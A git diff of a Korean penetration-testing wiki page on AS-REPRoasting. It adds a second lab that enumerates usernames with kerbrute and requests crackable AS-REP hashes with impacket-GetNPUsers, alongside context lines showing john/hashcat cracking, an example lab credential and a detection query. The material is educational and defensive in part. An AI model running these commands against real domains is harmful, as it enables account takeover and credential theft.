@@ -40,7 +40,7 @@ AS-REPRoasting 은 다음과 같이 이뤄진다.
 
 `Do not require Kerberos Preauthentication` 이라는 설정은 이렇게 위험한데 왜 존재하는 것일까? 왜 마이크로소프트사는 커버로스 인증의 2단계를 무력화 시키는 이 설정을 만든 것일까? 답은 놀랍게도, 모른다. 그저 리눅스/맥을 사용하는 유저들이나 외부 솔루션들이 사용하는 도메인 유저들 중 이 설정이 필요하다고 추측만 할 뿐이다.&#x20;
 
-### 실습&#x20;
+### 실습 - 1
 
 **전제 조건**&#x20;
 
@@ -65,13 +65,30 @@ john --wordlist=/usr/share/wordlists/rockyou.txt roast.txt
 hashcat -m 18200 -a 0 .\asreproast.txt .\rockyou.txt
 ```
 
-![](<../../.gitbook/assets/image (5).png>)
+![](<../../.gitbook/assets/image (5) (1).png>)
 
 3\. 공격자는 타겟 유저의 이름 (`linuxadmin`) 과 평문 비밀번호 (`Ohnonono123!`) 를 통해 유저 계정을 장악한다.&#x20;
 
+
+
+### 실습 - 2&#x20;
+
+도메인 유저 맥락이 없고 [커버로스 유저 이름 정보 수집](../../enumeration/kerberos-username-enumeration.md)을 통해 유저 이름 리스트를 확보했다면 해당 리스트에 AS-REPRoasting 이 가능한 유저가 있는지 알아본 뒤, 브루트포스 할 `KRB-AS-REP` 응답을 받아온다.&#x20;
+
+```
+./kerbrute userenum -d <domain> --dc <dc-ip> <username-list> | tee <output-file>
+cat kerbrute-output.txt | grep -i 'valid username' | cut -d ' ' -f 8 > valid-usernames.txt
+
+impacket-GetNPUsers <domain>/ -request -usersfile valid-usernames.txt  -dc-ip <dc-ip>
+```
+
+![](<../../.gitbook/assets/image (5).png>)
+
+받아온 `KRB-AS-REP` 응답은 위 실습-1 처럼 johntheripper 나 hashcat 을 이용해 브루트포스한다.&#x20;
+
 ### 대응 방안&#x20;
 
-* `Do not require Kerberos preauthentication` 설정이 있는 유저들이 존재하는지 확인한다.&#x20;
+* `Do not require Kerberos preauthentication` 설정이  유저들이 존재하는지 확인한다.&#x20;
 
 ```
 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Select-Object -Property name,enabled
